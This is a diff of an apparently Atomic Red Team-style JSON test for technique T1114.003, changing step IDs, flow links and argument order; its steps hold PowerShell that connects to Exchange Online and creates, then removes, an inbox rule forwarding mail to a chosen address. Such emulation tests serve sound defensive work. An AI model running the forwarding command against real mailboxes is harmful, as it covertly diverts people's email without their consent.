@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "d646284d-dab2-4960-b89f-86d87f40cc52",
+      "id": "25bc2d7d-3811-4919-9133-b2b11edf419c",
       "type": "execute-command",
       "data": {
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "c5a3c840-a752-4055-8c98-bbae586c13d1",
+      "id": "b3390110-c32d-46a5-a95f-f8d94e6c5d62",
       "type": "execute-command",
       "data": {
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
+      "id": "edbf0020-8647-495b-a308-16611afa8120",
       "name": "Check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "26d46d5e-02cb-4d13-8a9d-549aaad317ef",
+      "id": "7f8627a7-14fa-4d5f-a46b-3b85ee1c7ec7",
       "name": "Resolve dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "fbe0d053-49e5-4701-8fc4-6fb8efb97719",
+      "id": "cefa0fa4-5472-4736-8457-99aee2c1b3d8",
       "name": "Re-check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "d646284d-dab2-4960-b89f-86d87f40cc52",
+      "s": "25bc2d7d-3811-4919-9133-b2b11edf419c",
       "p": "on-success",
-      "o": "c5a3c840-a752-4055-8c98-bbae586c13d1"
+      "o": "b3390110-c32d-46a5-a95f-f8d94e6c5d62"
     },
     {
-      "s": "d646284d-dab2-4960-b89f-86d87f40cc52",
+      "s": "25bc2d7d-3811-4919-9133-b2b11edf419c",
       "p": "on-failure",
-      "o": "c5a3c840-a752-4055-8c98-bbae586c13d1"
+      "o": "b3390110-c32d-46a5-a95f-f8d94e6c5d62"
     },
     {
-      "s": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
+      "s": "edbf0020-8647-495b-a308-16611afa8120",
       "p": "on-success",
-      "o": "d646284d-dab2-4960-b89f-86d87f40cc52"
+      "o": "25bc2d7d-3811-4919-9133-b2b11edf419c"
     },
     {
-      "s": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
+      "s": "edbf0020-8647-495b-a308-16611afa8120",
       "p": "on-failure",
-      "o": "26d46d5e-02cb-4d13-8a9d-549aaad317ef"
+      "o": "7f8627a7-14fa-4d5f-a46b-3b85ee1c7ec7"
     },
     {
-      "s": "26d46d5e-02cb-4d13-8a9d-549aaad317ef",
+      "s": "7f8627a7-14fa-4d5f-a46b-3b85ee1c7ec7",
       "p": "on-success",
-      "o": "fbe0d053-49e5-4701-8fc4-6fb8efb97719"
+      "o": "cefa0fa4-5472-4736-8457-99aee2c1b3d8"
     },
     {
-      "s": "fbe0d053-49e5-4701-8fc4-6fb8efb97719",
+      "s": "cefa0fa4-5472-4736-8457-99aee2c1b3d8",
       "p": "on-failure",
-      "o": "d646284d-dab2-4960-b89f-86d87f40cc52"
+      "o": "25bc2d7d-3811-4919-9133-b2b11edf419c"
     }
   ],
   "tags": [
@@ -95,12 +95,6 @@
     "T1114.003"
   ],
   "input_arguments": [
-    {
-      "name": "rule_name",
-      "type": "string",
-      "description": "email rule name",
-      "value": "Atomic Red Team Email Rule"
-    },
     {
       "name": "forwarding_email",
       "type": "string",
@@ -118,6 +112,12 @@
       "type": "string",
       "description": "office-365 password",
       "value": ""
+    },
+    {
+      "name": "rule_name",
+      "type": "string",
+      "description": "email rule name",
+      "value": "Atomic Red Team Email Rule"
     }
   ]
 }
